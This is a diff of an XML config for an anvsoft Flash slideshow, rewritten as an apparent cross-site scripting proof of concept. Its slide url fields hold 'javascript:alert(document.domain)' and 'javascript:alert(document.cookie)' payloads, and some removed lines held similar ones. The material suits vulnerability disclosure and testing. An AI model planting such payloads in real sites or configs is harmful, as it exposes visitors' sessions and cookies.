@@ -2,7 +2,7 @@
 <flash_parameters copyright="anvsoftPFMTheme">
     <preferences>
         <global>
-            <basic_property movieWidth="500" movieHeight="400" html_title="Title" loadStyle="Bar" startAutoPlay="true" continuum="true" anvsoftMenu="false" backgroundColor="0x005080" hideAdobeMenu="false" photoDynamicShow="true" enableURL="true" transitionArray=""/>
+            <basic_property movieWidth="500" movieHeight="400" html_title="Proof Of Concept" loadStyle="Bar" startAutoPlay="true" continuum="true" anvsoftMenu="false" backgroundColor="0x005080" hideAdobeMenu="false" photoDynamicShow="true" enableURL="true" transitionArray=""/>
             <title_property showTitle="true" photoTitleColor="0xff0000" backgroundColor="0xffffff" alpha="50" autoHide="true"/>
             <music_property path="" stream="true" loop="true"/>
             <photo_property topPadding="0" bottomPadding="40" leftPadding="0" rightPadding="0"/>
@@ -13,65 +13,7 @@
         </thumbnail>
     </preferences>
     <album>
-        <slide jpegURL="thumbs/t_0001.jpg" d_URL="javascript:alert(document.domain)" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="1" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0002.jpg" d_URL="alert(document.domain)" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="2" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0003.jpg" d_URL="slides/p_0003.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="3" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0004.jpg" d_URL="slides/p_0004.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="4" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0005.jpg" d_URL="slides/p_0005.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="5" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0006.jpg" d_URL="slides/p_0006.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="6" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0007.jpg" d_URL="slides/p_0007.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="7" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0008.jpg" d_URL="slides/p_0008.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="8" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0009.jpg" d_URL="slides/p_0009.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="9" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0010.jpg" d_URL="slides/p_0010.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="10" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0011.jpg" d_URL="slides/p_0011.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="11" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0012.jpg" d_URL="slides/p_0012.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="12" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0013.jpg" d_URL="slides/p_0013.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="13" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0014.jpg" d_URL="slides/p_0014.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="14" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0015.jpg" d_URL="slides/p_0015.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="15" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0016.jpg" d_URL="slides/p_0016.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="16" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0017.jpg" d_URL="slides/p_0017.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="17" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0018.jpg" d_URL="slides/p_0018.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="18" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0019.jpg" d_URL="slides/p_0019.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="19" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0020.jpg" d_URL="slides/p_0020.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="20" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0021.jpg" d_URL="slides/p_0021.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="21" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0022.jpg" d_URL="slides/p_0022.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="22" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0023.jpg" d_URL="slides/p_0023.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="23" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0024.jpg" d_URL="slides/p_0024.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="24" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0025.jpg" d_URL="slides/p_0025.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="25" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0026.jpg" d_URL="slides/p_0026.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="26" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0027.jpg" d_URL="slides/p_0027.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="27" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0028.jpg" d_URL="slides/p_0028.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="28" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0029.jpg" d_URL="slides/p_0029.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="29" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0030.jpg" d_URL="slides/p_0030.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="30" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0031.jpg" d_URL="slides/p_0031.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="31" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0032.jpg" d_URL="slides/p_0032.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="32" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0033.jpg" d_URL="slides/p_0033.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="33" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0034.jpg" d_URL="slides/p_0034.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="34" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0035.jpg" d_URL="slides/p_0035.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="35" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0036.jpg" d_URL="slides/p_0036.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="36" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0037.jpg" d_URL="slides/p_0037.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="37" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0038.jpg" d_URL="slides/p_0038.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="38" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0039.jpg" d_URL="slides/p_0039.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="39" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0040.jpg" d_URL="slides/p_0040.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="40" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0041.jpg" d_URL="slides/p_0041.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="41" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0042.jpg" d_URL="slides/p_0042.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="42" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0043.jpg" d_URL="slides/p_0043.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="43" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0044.jpg" d_URL="slides/p_0044.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="44" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0045.jpg" d_URL="slides/p_0045.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="45" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0046.jpg" d_URL="slides/p_0046.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="46" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0047.jpg" d_URL="slides/p_0047.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="47" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0048.jpg" d_URL="slides/p_0048.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="48" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0049.jpg" d_URL="slides/p_0049.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="49" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0050.jpg" d_URL="slides/p_0050.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="50" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0051.jpg" d_URL="slides/p_0051.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="51" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0052.jpg" d_URL="slides/p_0052.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="52" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0053.jpg" d_URL="slides/p_0053.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="53" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0054.jpg" d_URL="slides/p_0054.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="54" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0055.jpg" d_URL="slides/p_0055.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="55" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0056.jpg" d_URL="slides/p_0056.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="56" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0057.jpg" d_URL="slides/p_0057.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="57" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0058.jpg" d_URL="slides/p_0058.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="58" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0059.jpg" d_URL="slides/p_0059.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="59" width="480" height="360"/>
-        <slide jpegURL="thumbs/t_0060.jpg" d_URL="slides/p_0060.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="#" title="60" width="480" height="360"/>
+        <slide jpegURL="poc/cat1.jpg" d_URL="poc/cat1.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="javascript:alert(document.domain)" title="CAT 1" width="480" height="360"/>
+        <slide jpegURL="poc/cat2.jpg" d_URL="poc/cat2.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="javascript:alert(document.cookie)" title="CAT 2" width="480" height="360"/>
     </album>
 </flash_parameters>
